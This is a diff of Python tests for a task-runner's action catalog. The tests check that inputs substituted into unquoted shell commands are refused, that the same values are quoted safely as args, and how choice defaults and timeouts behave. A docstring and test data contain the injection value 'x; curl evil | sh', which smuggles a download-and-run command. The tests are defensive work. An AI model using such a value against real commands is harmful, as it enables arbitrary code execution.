@@ -239,6 +239,114 @@ command = "deploy ${input:missing}"
     assert any("undeclared input" in item for item in catalog.diagnostics)
 
 
+def test_an_input_in_an_unquoted_shell_command_is_refused_at_discovery(
+    tmp_path: Path,
+) -> None:
+    """The one place a substituted value would reach a shell as syntax.
+
+    A `shell` step with no args passes its command string through untouched, so
+    `command = "git checkout ${input:branch}"` with `branch = "x; curl evil | sh"`
+    would run a second command no human approved. That is exactly the property the
+    trust boundary rests on, so the shape is refused rather than quoted: quoting
+    needs the shell dialect, which is not resolved until spawn.
+    """
+    catalog = catalog_for(
+        tmp_path,
+        """version = 1
+[[actions]]
+id = "checkout"
+label = "Checkout"
+type = "shell"
+command = "git checkout ${input:branch}"
+
+[[actions.inputs]]
+id = "branch"
+label = "Branch"
+default = "main"
+""",
+    )
+
+    assert catalog.actions == ()
+    assert any("cannot carry an input" in item for item in catalog.diagnostics)
+
+
+def test_the_same_value_is_allowed_in_args_where_it_is_quoted(tmp_path: Path) -> None:
+    """`_shell_command_line` quotes each arg in the target shell's own dialect."""
+    catalog = catalog_for(
+        tmp_path,
+        """version = 1
+[[actions]]
+id = "checkout"
+label = "Checkout"
+type = "shell"
+command = "git"
+args = ["checkout", "${input:branch}"]
+
+[[actions.inputs]]
+id = "branch"
+label = "Branch"
+default = "main"
+""",
+    )
+    action = find(catalog, "native:checkout")
+
+    filled = substituted_action(action, {"branch": "x; curl evil | sh"}, Path(catalog.root))
+
+    # The value stays one argument. The quoting happens in `action_spawn_body`, and
+    # the point here is that it *reaches* the quoting path at all.
+    assert filled.steps[0].args == ("checkout", "x; curl evil | sh")
+
+
+def test_a_process_step_may_carry_an_input_in_its_command(tmp_path: Path) -> None:
+    """No shell is involved, so there is no syntax for a value to become."""
+    catalog = catalog_for(
+        tmp_path,
+        """version = 1
+[[actions]]
+id = "run"
+label = "Run"
+type = "process"
+command = "${input:tool}"
+
+[[actions.inputs]]
+id = "tool"
+label = "Tool"
+default = "pytest"
+""",
+    )
+
+    assert find(catalog, "native:run").steps[0].command == "${input:tool}"
+
+
+def test_a_choice_input_without_a_default_takes_its_first_option(tmp_path: Path) -> None:
+    """Otherwise it is unrunnable as presented: "" matches no option.
+
+    The select renders blank, submitting it fails the same validation, and an agent
+    that omits the key gets the identical error.
+    """
+    catalog = catalog_for(
+        tmp_path,
+        """version = 1
+[[actions]]
+id = "deploy"
+label = "Deploy"
+type = "process"
+command = "deploy"
+args = ["${input:environment}"]
+
+[[actions.inputs]]
+id = "environment"
+label = "Environment"
+kind = "choice"
+options = ["staging", "production"]
+""",
+    )
+    action = find(catalog, "native:deploy")
+
+    assert action.inputs[0].default == "staging"
+    assert substituted_action(action, {}, Path(catalog.root)).steps[0].args == ("staging",)
+
+
 def test_an_input_naming_a_directory_is_still_contained_after_substitution(
     tmp_path: Path,
 ) -> None:
@@ -276,9 +384,17 @@ def test_vscode_prompt_inputs_are_imported(tmp_path: Path) -> None:
                     {
                         "label": "deploy",
                         "type": "shell",
-                        "command": "deploy --env ${input:environment}",
+                        "command": "deploy",
+                        "args": ["--env", "${input:environment}"],
                         "detail": "Deploy somewhere",
-                    }
+                    },
+                    # The unquotable shape, which is refused for an imported task on
+                    # exactly the same grounds as for a native one.
+                    {
+                        "label": "unsafe",
+                        "type": "shell",
+                        "command": "git checkout ${input:environment}",
+                    },
                 ],
                 "inputs": [
                     {
@@ -302,6 +418,8 @@ def test_vscode_prompt_inputs_are_imported(tmp_path: Path) -> None:
     assert action.description == "Deploy somewhere"
     assert [item.id for item in action.inputs] == ["environment"]
     assert action.inputs[0].kind == "choice"
+    assert [item.id for item in catalog.actions] == ["vscode:deploy"]
+    assert any("cannot carry an input" in item for item in catalog.diagnostics)
 
 
 # --- per-file trust -----------------------------------------------------------
@@ -511,7 +629,38 @@ async def test_a_step_timeout_stops_a_session_that_is_still_running() -> None:
 
 
 @pytest.mark.asyncio
-async def test_a_timeout_does_nothing_to_a_session_that_already_finished() -> None:
+@pytest.mark.parametrize("state", ["exited", "crashed"])
+async def test_a_timeout_does_nothing_to_a_step_that_already_finished(state: str) -> None:
+    """A finished one-shot step is retained in the live table, not removed.
+
+    Its scrollback and exit code are what a task result is read from, so the timer
+    has to test the state rather than a lookup miss. Guarding on the string "ended",
+    which `SessionState` does not contain, meant a 3600-second timeout fired an hour
+    after a 20-second step succeeded and reported a timeout for it.
+    """
+    stopped: list[str] = []
+    finished = SimpleNamespace(record=SimpleNamespace(id="task-1", state=state))
+
+    async def stop(sid: str) -> None:  # pragma: no cover - must never run
+        stopped.append(sid)
+
+    app: dict[str, Any] = {
+        "sessions": SimpleNamespace(sessions={"task-1": finished}, stop=stop),
+        "events": EventBus(),
+        "action_timeout_tasks": set(),
+    }
+    events = app["events"].subscribe(name="test")
+    step = SimpleNamespace(name="quick", timeout_seconds=0.01)
+
+    _arm_action_timeout(app, "task-1", step, "p1", "native:quick")  # type: ignore[arg-type]
+    await asyncio.gather(*app["action_timeout_tasks"])
+
+    assert stopped == []
+    assert events.qsize() == 0
+
+
+@pytest.mark.asyncio
+async def test_a_timeout_does_nothing_to_a_session_that_was_removed() -> None:
     stopped: list[str] = []
 
     async def stop(sid: str) -> None:  # pragma: no cover - must never run
